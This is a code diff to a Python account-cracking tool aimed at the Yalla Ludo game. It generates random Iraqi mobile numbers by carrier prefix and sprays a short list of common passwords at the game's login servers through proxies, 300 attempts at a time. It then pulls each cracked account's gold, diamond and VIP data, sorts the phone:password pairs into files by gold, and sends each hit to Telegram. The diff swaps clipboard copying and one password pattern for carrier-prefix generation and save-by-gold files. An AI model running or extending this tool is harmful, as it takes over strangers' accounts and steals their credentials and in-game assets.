@@ -20,7 +20,6 @@ from collections import defaultdict
 from datetime import datetime
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
-import pyperclip
 
 try:
     from rich.console import Console
@@ -68,9 +67,104 @@ CHAT_IDS = []
 MAX_RESULTS = 0
 PROXY_FILE = "/storage/emulated/0/Download/proxyscrape_premium_http_proxies.txt"
 
+# ============================================================
+# PASSWORDS & NUMBERS CONFIG
+# ============================================================
 PASSWORDS_IQ = ["qwer1234", "1234qwer", "1q2w3e4r", "qwert12345", "zxcv1234", "12345qwert"]
-PHONE_PASSWORDS = ["077","079"،"075","078"]
 
+# أرقام عراقية (آسيا, زين, كورك)
+PREFIXES = {
+    "اسيا": ["770", "771", "772", "773", "774", "775", "776", "777", "778", "779"],
+    "زين": ["780", "781", "782", "783", "784", "785", "786", "787", "788", "789"],
+    "كورك": ["790", "791", "792", "793", "794", "795", "796", "797", "798", "799"]
+}
+
+def generate_mobile_by_company(company=None):
+    if company and company in PREFIXES:
+        prefix = random.choice(PREFIXES[company])
+    else:
+        all_prefixes = []
+        for p in PREFIXES.values():
+            all_prefixes.extend(p)
+        prefix = random.choice(all_prefixes)
+    suffix = ''.join(random.choices('0123456789', k=7))
+    return prefix + suffix
+
+used_numbers = set()
+used_lock = threading.Lock()
+
+def generate_mobile_iq():
+    while True:
+        # اختيار عشوائي بين الشركات
+        company = random.choice(list(PREFIXES.keys()))
+        mobile = generate_mobile_by_company(company)
+        with used_lock:
+            if mobile not in used_numbers:
+                used_numbers.add(mobile)
+                return mobile
+
+# ============================================================
+# SAVE FUNCTIONS - تقسيم حسب الذهب
+# ============================================================
+def save_account_by_gold(account):
+    gold = account.get('gold', 0)
+    phone = account['phone']
+    password = account['password']
+    
+    # تحديد الملف حسب كمية الذهب
+    if gold < 1000000:
+        filename = "gold_0_1M.txt"
+    elif gold < 5000000:
+        filename = "gold_1M_5M.txt"
+    elif gold < 10000000:
+        filename = "gold_5M_10M.txt"
+    elif gold < 50000000:
+        filename = "gold_10M_50M.txt"
+    elif gold < 100000000:
+        filename = "gold_50M_100M.txt"
+    else:
+        filename = "gold_100M_plus.txt"
+    
+    # حفظ الرقم والباسورد
+    try:
+        with open(filename, 'a', encoding='utf-8') as f:
+            f.write(f"{phone}:{password}\n")
+        return filename
+    except Exception as e:
+        return None
+
+def save_account_full_by_gold(account):
+    gold = account.get('gold', 0)
+    filename = "good_accounts_full.txt"
+    
+    try:
+        with open(filename, 'a', encoding='utf-8') as f:
+            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
+            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
+        return True
+    except Exception as e:
+        return False
+
+def save_account_to_file(account, filepath):
+    try:
+        with open(filepath, 'a', encoding='utf-8') as f:
+            f.write(f"{account['phone']}:{account['password']}\n")
+        return True
+    except Exception as e:
+        return False
+
+def save_account_full(account, filepath):
+    try:
+        with open(filepath, 'a', encoding='utf-8') as f:
+            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
+            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
+        return True
+    except Exception as e:
+        return False
+
+# ============================================================
+# CRYPTO FUNCTIONS
+# ============================================================
 def _aes_cbc(key, iv, pt):
     cipher = AES.new(key, AES.MODE_CBC, iv)
     return cipher.encrypt(pad(pt, 16))
@@ -98,6 +192,9 @@ def _gen_dev():
 def _gen_traceparent():
     return f"00-{uuid.uuid4().hex + uuid.uuid4().hex[:16]}-{uuid.uuid4().hex[:16]}-00"
 
+# ============================================================
+# BUILD REQUESTS
+# ============================================================
 def build_login(mobile, password_md5, area_code=964):
     now = int(time.time() * 1000)
     device_id, android_id, shumeng, nonce = _gen_dev()
@@ -235,6 +332,9 @@ def build_profile(token, user_id, dev):
     
     return headers, {"paramJsonString": param}
 
+# ============================================================
+# LOGIN & PROFILE
+# ============================================================
 async def login_account(session, mobile, password_md5, area_code=964, proxy=None):
     for server in LOGIN_SERVERS:
         try:
@@ -309,6 +409,9 @@ async def fetch_profile(session, token, user_id, dev, proxy=None):
     
     return None
 
+# ============================================================
+# STATISTICS
+# ============================================================
 stats = defaultdict(int)
 gold_stats = defaultdict(int)
 diamond_stats = defaultdict(int)
@@ -320,51 +423,9 @@ stats_lock = threading.Lock()
 stop_flag = False
 start_time = time.time()
 
-def save_account_to_file(account, filepath):
-    try:
-        with open(filepath, 'a', encoding='utf-8') as f:
-            f.write(f"{account['phone']}:{account['password']}\n")
-        return True
-    except Exception as e:
-        return False
-
-def save_account_full(account, filepath):
-    try:
-        with open(filepath, 'a', encoding='utf-8') as f:
-            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
-            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
-        return True
-    except Exception as e:
-        return False
-
-def save_account_by_gold(account):
-    gold = account.get('gold', 0)
-    folder = "accounts_by_gold"
-    os.makedirs(folder, exist_ok=True)
-    
-    if gold < 1000000:
-        filename = f"{folder}/0-1M.txt"
-    elif gold < 5000000:
-        filename = f"{folder}/1M-5M.txt"
-    elif gold < 10000000:
-        filename = f"{folder}/5M-10M.txt"
-    elif gold < 20000000:
-        filename = f"{folder}/10M-20M.txt"
-    elif gold < 50000000:
-        filename = f"{folder}/20M-50M.txt"
-    elif gold < 100000000:
-        filename = f"{folder}/50M-100M.txt"
-    else:
-        filename = f"{folder}/100M+.txt"
-    
-    try:
-        with open(filename, 'a', encoding='utf-8') as f:
-            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
-            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Gold: {gold:,} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
-        return True
-    except Exception as e:
-        return False
-
+# ============================================================
+# PROXY MANAGER
+# ============================================================
 class ProxyManager:
     def __init__(self, proxy_file=""):
         self.proxies = []
@@ -453,62 +514,24 @@ class ProxyManager:
 
 proxy_manager = None
 
-used_numbers = set()
-used_lock = threading.Lock()
-
-def generate_mobile_iq():
-    while True:
-        third = random.choice('0123456789')
-        prefix = '77' + third
-        suffix = ''.join(random.choices('0123456789', k=7))
-        mobile = prefix + suffix
-        with used_lock:
-            if mobile not in used_numbers:
-                used_numbers.add(mobile)
-                return mobile
-
-def copy_to_clipboard(text):
-    try:
-        pyperclip.copy(text)
-        return True
-    except:
-        return False
-
+# ============================================================
+# TELEGRAM SEND WITH SHORT FORMAT
+# ============================================================
 async def send_telegram_async(session, phone, pwd, name, uid, gold, diamond, level, exp, max_exp, royal, is_vip, vip_type, vip_end_time):
     if not BOT_TOKEN or not CHAT_IDS:
         return False
     
-    message = f"""✅ Yalla Ludo Account Found!
+    # رسالة مختصرة (ضغط)
+    message = f"""✅ Yalla Ludo Hit!
 
-📱 Phone: {phone}
-🔑 Pass: {pwd}
-👤 Name: {name}
-🆔 ID: {uid}
-💰 Gold: {gold:,}
-💎 Diamond: {diamond:,}
-📊 Level: {level}"""
-    
-    if exp > 0:
-        message += f"\n⭐ XP: {exp:,} / {max_exp:,}"
-    if royal > 0:
-        message += f"\n👑 Royal: {royal}"
+📱 {phone} | 🔑 {pwd}
+👤 {name} | 🆔 {uid}
+💰 {gold:,} | 💎 {diamond:,} | 📊 {level}"""
     
     if is_vip:
-        message += f"\n🏅 VIP: ✅ Yes"
-        if vip_type:
-            message += f"\n📦 VIP Type: {vip_type}"
-        if vip_end_time:
-            try:
-                end_date = datetime.fromtimestamp(vip_end_time/1000).strftime('%Y-%m-%d %H:%M')
-                message += f"\n⏰ VIP Ends: {end_date}"
-            except:
-                pass
-    else:
-        message += f"\n🏅 VIP: ❌ No"
+        message += f" | 👑 VIP"
     
     message += f"\n\nBy @to_ls"
-    
-    copy_to_clipboard(f"{phone}:{pwd}")
     
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     all_success = True
@@ -558,8 +581,6 @@ async def send_telegram_verify_async(session, phone, pwd, name, uid, reason):
 
 By @to_ls"""
     
-    copy_to_clipboard(f"{phone}:{pwd}")
-    
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     all_success = True
     
@@ -596,15 +617,13 @@ By @to_ls"""
     
     return all_success
 
+# ============================================================
+# CHECK NUMBER
+# ============================================================
 async def check_number_async(session, mobile, semaphore, proxy=None):
     global stats, gold_stats, diamond_stats, level_stats, vip_stats, found_accounts, verify_accounts, stop_flag
     async with semaphore:
-        all_passwords = list(PASSWORDS_IQ)
-        
-        for prefix in PHONE_PASSWORDS:
-            all_passwords.append(f"{prefix}{mobile[-8:]}")
-        
-        for pwd in all_passwords:
+        for pwd in PASSWORDS_IQ:
             if stop_flag:
                 return
             
@@ -729,10 +748,8 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                             gold_stats["1M-4.9M"] += 1
                         elif gold < 10000000:
                             gold_stats["5M-9.9M"] += 1
-                        elif gold < 20000000:
-                            gold_stats["10M-19M"] += 1
                         elif gold < 50000000:
-                            gold_stats["20M-49M"] += 1
+                            gold_stats["10M-49M"] += 1
                         elif gold < 100000000:
                             gold_stats["50M-99M"] += 1
                         else:
@@ -771,9 +788,9 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                         
                         found_accounts.append(account_data)
                     
-                    save_account_to_file(account_data, "good_accounts.txt")
-                    save_account_full(account_data, "good_accounts_full.txt")
-                    save_account_by_gold(account_data)
+                    # حفظ حسب الذهب
+                    saved_file = save_account_by_gold(account_data)
+                    save_account_full_by_gold(account_data)
                     
                     if RICH_AVAILABLE:
                         console.print(f"\n[green][+][/green] GOOD: [bold green]{mobile}[/bold green] | [bold yellow]{pwd}[/bold yellow]")
@@ -802,8 +819,7 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                         if proxy:
                             proxy_clean = proxy.split('@')[-1] if '@' in proxy else proxy
                             console.print(f"    Proxy: [dim]{proxy_clean}[/dim]")
-                        console.print(f"    [dim]Saved to accounts_by_gold/[/dim]")
-                        console.print(f"    [dim]Copied to clipboard: {mobile}:{pwd}[/dim]")
+                        console.print(f"    [dim]Saved to {saved_file}[/dim]")
                     else:
                         print(f"\n[+] GOOD: {mobile} | {pwd}")
                         print(f"    Name: {name}")
@@ -831,11 +847,10 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                         if proxy:
                             proxy_clean = proxy.split('@')[-1] if '@' in proxy else proxy
                             print(f"    Proxy: {proxy_clean}")
-                        print(f"    Saved to accounts_by_gold/")
-                        print(f"    Copied to clipboard: {mobile}:{pwd}")
+                        print(f"    Saved to {saved_file}")
                     
                     if RICH_AVAILABLE:
-                        console.print("[yellow][!][/yellow] Sending to all Telegram recipients...")
+                        console.print("[yellow][!][/yellow] Sending to Telegram...")
                     
                     await send_telegram_async(session, mobile, pwd, name, uid, gold, diamond, level, exp, max_exp, royal, is_vip, vip_type, vip_end_time)
                     return
@@ -864,6 +879,9 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
             stats['wrong_pass'] += 1
             stats['total'] += 1
 
+# ============================================================
+# DASHBOARD
+# ============================================================
 def create_dashboard():
     elapsed = int(time.time() - start_time)
     hours = elapsed // 3600
@@ -900,8 +918,7 @@ def create_dashboard():
         gold_table.add_row("0-999K", str(gold_stats.get('0-999K', 0)))
         gold_table.add_row("1M-4.9M", str(gold_stats.get('1M-4.9M', 0)))
         gold_table.add_row("5M-9.9M", str(gold_stats.get('5M-9.9M', 0)))
-        gold_table.add_row("10M-19M", str(gold_stats.get('10M-19M', 0)))
-        gold_table.add_row("20M-49M", str(gold_stats.get('20M-49M', 0)))
+        gold_table.add_row("10M-49M", str(gold_stats.get('10M-49M', 0)))
         gold_table.add_row("50M-99M", str(gold_stats.get('50M-99M', 0)))
         gold_table.add_row("100M+", str(gold_stats.get('100M+', 0)))
         
@@ -973,8 +990,7 @@ def create_dashboard():
     0-999K    : {gold_stats.get('0-999K', 0)}
     1M-4.9M   : {gold_stats.get('1M-4.9M', 0)}
     5M-9.9M   : {gold_stats.get('5M-9.9M', 0)}
-    10M-19M   : {gold_stats.get('10M-19M', 0)}
-    20M-49M   : {gold_stats.get('20M-49M', 0)}
+    10M-49M   : {gold_stats.get('10M-49M', 0)}
     50M-99M   : {gold_stats.get('50M-99M', 0)}
     100M+     : {gold_stats.get('100M+', 0)}
 
@@ -1025,6 +1041,9 @@ def dashboard_loop():
             print(create_dashboard())
             time.sleep(1)
 
+# ============================================================
+# MAIN
+# ============================================================
 async def main_async():
     global stop_flag, BOT_TOKEN, CHAT_IDS, proxy_manager
     
@@ -1063,8 +1082,6 @@ async def main_async():
         print("[!] No bot token provided, Telegram disabled")
     
     print("\n[+] Starting checker...\n")
-    print("[+] Accounts will be saved in 'accounts_by_gold/' folder by gold amount")
-    print("[+] Passwords will be copied to clipboard automatically\n")
     
     concurrency = 300
     semaphore = asyncio.Semaphore(concurrency)
